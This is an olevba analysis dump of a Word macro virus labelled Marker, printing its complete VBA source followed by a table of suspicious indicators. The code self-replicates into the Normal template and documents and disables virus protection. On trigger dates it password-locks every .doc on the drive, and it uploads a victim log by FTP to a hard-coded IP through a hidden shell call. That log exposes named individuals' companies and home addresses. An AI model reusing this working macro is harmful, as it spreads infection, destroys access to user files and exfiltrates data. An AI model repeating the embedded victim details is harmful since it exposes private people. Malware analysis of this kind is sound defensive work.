olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-de53db38f16a235a2de3c5c1c89a7c3b760d7ee8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-de53db38f16a235a2de3c5c1c89a7c3b760d7ee8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error GoTo 0
Dim i, j As Integer
j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
    If Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = False Then
        Dim b, l As Integer
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = True Then
                    b = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(b, b + l)
                Else
                    b = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(b, b + l)
            End If
        End If
    End If
Next i
If (Month(Date) = 11 And Day(Date) = 10) Or (Month(Date) = 7 And Day(Date) = 1) Then
Set fs = Application.FileSearch
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            On Error GoTo Exitsub
            Documents.Open FileName:=fs.FileSearch, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
            ActiveDocument.Password = "xyz"
            ActiveDocument.Save
            ActiveDocument.Close
Exitsub:
        On Error GoTo 0
        Next i
    End If
End If
End Sub











































Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 09:23:32 AM - Wednesday, 23 Dec 1998
' bcbsa
'



' 12:08:05 PM - Monday, 4 Jan 1999
' ISG
'



' 02:41:37 PM - Tuesday, 5 Jan 1999
' Information Systems Group
'



' 12:49:03 PM - Saturday, 9 Jan 1999
' Mona Sowisky
' CSC Healthcare
' One Embarcadero, Suite 2800
' San Francisco, CA 94111



' 10:30:59 PM - Sunday, 10 Jan 1999
' Information Systems
' CSC Healthcare
' 1675 Broadway, 18th Floor
' New York, NY 10019



' 09:25:05 PM - Monday, 11 Jan 1999
' Marge Bayus
'



' 04:56:44 PM - Thursday, 28 Jan 1999
' David Merritt
'



' 08:50:08 AM - Monday, 1 Feb 1999
' Renee Radcliffe
'



' 05:23:48 PM - Tuesday, 2 Feb 1999
' Ross Mandel
'



' 12:39:52 PM - Thursday, 4 Feb 1999
' Jo Stevens
'



' 07:35:02 AM - Friday, 5 Feb 1999
' HILL AND KNOWLTON
'



' 09:31:13 AM - Friday, 5 Feb 1999
' jstevens
'



' 08:54:00 AM - Monday, 8 Feb 1999
' Valued Gateway Customer
'



' 02:46:51 PM - Wednesday, 10 Feb 1999
' Annette Weber
' Annette Weber
' 6121 Winsome, #27C
' Houston, TX  77057



' 03:10:09 PM - Thursday, 11 Feb 1999
' Claudia Morlan
'



' 01:35:49 PM - Thursday, 18 Feb 1999
' mwhite
'



' 02:07:45 PM - Monday, 22 Feb 1999
' Scott Parsons
'



' 09:58:14 AM - Tuesday, 2 Mar 1999
' Rebecca Benson
'



' 05:00:06 PM - Wednesday, 3 Mar 1999
' Tanya K. LaBorde
'



' 11:57:32 AM - Friday, 5 Mar 1999
' tujian peng
'



' 03:25:53 苟敎 - Sunday, 14 Mar 1999
' Rosana SU
'



' 04:34:15 苟敎 - Sunday, 14 Mar 1999
' Michael Xu
'



' 02:57:37 苟敎 - Thursday, 18 Mar 1999
' Michael
'



' 02:30:42 PM - Wednesday, 12 May 1999
' 주�香�
'



' 04:10:37 PM - Monday, 17 May 1999
' lyn
'



' 01:58:52 PM - Thursday, 27 May 1999
' hello
'



' 05:59:15 PM - Thursday, 27 May 1999
' ZhengNing
'



' 09:25:01 AM - Tuesday, 22 Jun 1999
' xiangjd
'



' 09:46:51 AM - Monday, 5 Jul 1999
' ok
'



' 05:07:15 PM - Friday, 16 Jul 1999
' wjh
'



' 03:35:28 PM - Tuesday, 17 Aug 1999
' dk
'



' 10:35:17 AM - Thursday, 2 Sep 1999
' Jim
'



' 02:48:07 PM - Friday, 10 Sep 1999
' 냈究줬
'



' 08:39:55 AM - Tuesday, 28 Sep 1999
' client1
'



' 08:08:37 PM - Thursday, 30 Sep 1999
' 넋貴鉤
'



' 10:50:34 AM - Thursday, 14 Oct 1999
' hjy
'



' 10:23:14 AM - Tuesday, 26 Oct 1999
' jmc
'



' 10:02:59 AM - Monday, 1 Nov 1999
' jmc
'



' 03:47:09 PM - Thursday, 2 Dec 1999
' jmc
'



' 03:01:19 PM - Sunday, 12 Dec 1999
' duzp
'



' 10:48:58 PM - Monday, 10 Jan 2000
' zmh
'



' 03:23:13 오후 - Tuesday, 11 Jan 2000
' lty
'



' 12:21:48 오전 - Friday, 4 May 2001
' Tester
'


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

